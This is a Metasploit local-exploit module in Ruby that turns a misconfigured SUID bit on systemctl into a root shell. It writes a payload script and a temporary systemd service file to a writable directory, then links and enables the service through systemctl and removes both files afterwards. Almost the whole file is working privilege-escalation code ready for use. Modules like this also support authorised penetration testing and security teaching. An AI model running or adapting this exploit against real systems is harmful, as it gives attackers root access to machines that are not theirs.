##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info, {
        'Name'          => 'SUID systemctl Exploit',
        'Description'   => %q{ 
          This module attempt to exploit a misconfigured SUID bit on systemctl binary to escalate privileges & get a root shell!
          },
        'License'       => MSF_LICENSE,
        'Author'        => [ '0xl0v3r' ],
        'Platform'      => %w{ linux unix },
        'Arch'          => [ ARCH_CMD ],
        'SessionTypes'  => [ 'shell', 'meterpreter' ],
        'Targets'       =>
          [
            [ 'Command payload', { 'Arch' => ARCH_CMD } ],
          ],
        'DefaultOptions' => { "WfsDelay" => 2 },
        'DefaultTarget' => 0,
        'References'     =>
        [
          [ 'URL', 'https://gtfobins.github.io/gtfobins/systemctl/' ],
          [ 'URL', 'https://github.com/Code-L0V3R/suid_systemctl' ]
        ],

      }
      ))
    register_options [
      OptString.new("systemctl", [ true, "Path to systemctl executable", "/bin/systemctl" ]),
      OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ])
    ]
  end

  def check
    if file?(datastore["systemctl"])
      print_status("Checking the suid bit ...")
      if setuid? datastore["systemctl"]
      return CheckCode::Vulnerable
      end
    end
    return CheckCode::Safe
  end

  def exploit
    print_status(":: SUID systemctl exploit ::")
    print_status(":: Exploit Author : 0xl0v3r ::")
    if check
      print_good("The target is vulnerable.")
    else
      print_bad("The target is not vulnerable.")
    end
    payload_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.sh"
    print_status("Creating the temp Command payload file [ #{payload_file} ]")
    cmd_exec "echo \"#{payload.encoded.gsub(/"/, "\\\"")}\" > #{payload_file}"
    service_file = "#{datastore["WritableDir"]}/#{rand_text_alpha(3 + rand(5))}.service"
    print_status("Creating the temp service #{service_file}")
    cmd_exec "echo \"[Service]\nType=oneshot\nExecStart=/bin/bash '#{payload_file}'\n[Install]\nWantedBy=multi-user.target\" > #{service_file}"
    cmd_exec "chmod +x #{payload_file}"

    begin
      print_status("/bin/systemctl link #{service_file}")
      cmd_exec "#{datastore["systemctl"]} link #{service_file}"
      print_status("/bin/systemctl enable --now #{service_file}")
      cmd_exec "#{datastore["systemctl"]} enable --now #{service_file}"
    ensure
      print_status("Removing the temp service.")
      cmd_exec "#{datastore["systemctl"]} disable #{service_file}"
      cmd_exec "rm -rf #{service_file}"
      print_status("Removing the temp payload file.")
      cmd_exec "rm -rf #{payload_file}"
    end
  end
end

